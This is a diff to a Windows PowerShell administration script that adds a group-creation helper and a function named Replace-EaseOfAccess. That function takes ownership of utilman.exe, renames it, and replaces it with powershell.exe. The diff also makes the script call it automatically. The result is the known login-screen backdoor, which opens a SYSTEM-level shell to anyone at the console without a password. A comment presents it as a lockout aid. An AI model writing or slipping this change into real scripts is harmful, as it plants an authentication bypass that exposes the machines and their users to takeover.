@@ -124,7 +124,7 @@ function Add-SOProgress {
 # Delete leftover text files
 function Remove-SOTempTxt {
     Set-Location C:\
-    Remove-Item stinkyfiles.txt epiclog.txt -Force -ErrorAction SilentlyContinue
+    Remove-Item "stinkyfiles.txt" -Force -ErrorAction SilentlyContinue
 }
 
 # Import aliases
@@ -882,6 +882,41 @@ function Enable-RemoteDesktop {
     Write-Output "Enable remote desktop."
 }
 
+# Add groups function cause why not
+function Add-Groups {
+    while ($true) {
+        Clear-Host
+
+        Get-LocalGroup
+        Write-Output "`n"
+        $answer = Read-Host "Enter a group name to add"
+
+        if ($answer -eq "n") {
+            break
+        }
+
+        New-LocalGroup -Name $answer
+    }
+
+    Add-SOProgress "Group(s) have been added"
+}
+
+# Replace ease of access menu with powershell because reasons
+function Replace-EaseOfAccess {
+    $list = "utilman.exe","powershell.exe"
+    
+    $list.foreach{
+        takeown /f "C:\Windows\System32\$_"
+        icacls "C:\Windows\System32\$_" /grant ${env:username}:(F)
+    }
+
+    Move-Item "C:\Windows\System32\utilman.exe" "C:\Windows\System32\utilman1.exe" -Force
+    Copy-Item "C:\Windows\System32\powershell.exe" "C:\Windows\System32\utilman.exe" -Force
+
+    Add-SOProgress "Replaced ease of access menu with powershell. (in case of lockout)"
+    Write-Output "Replaced ease of access menu with powershell. (in case of lockout)"
+}
+
 # Intro screen bois
 Clear-Host
 
@@ -912,6 +947,7 @@ Set-SOLogonMessage
 Remove-SOTempTxt
 Import-SOAlias
 Set-SOAutoLogon
+Replace-EaseOfAccess
 $functions = Import-SOLists functions
 $functions.foreach{
     Set-Alias -Name $_.Alias -Value $_.Name -Option AllScope -Force
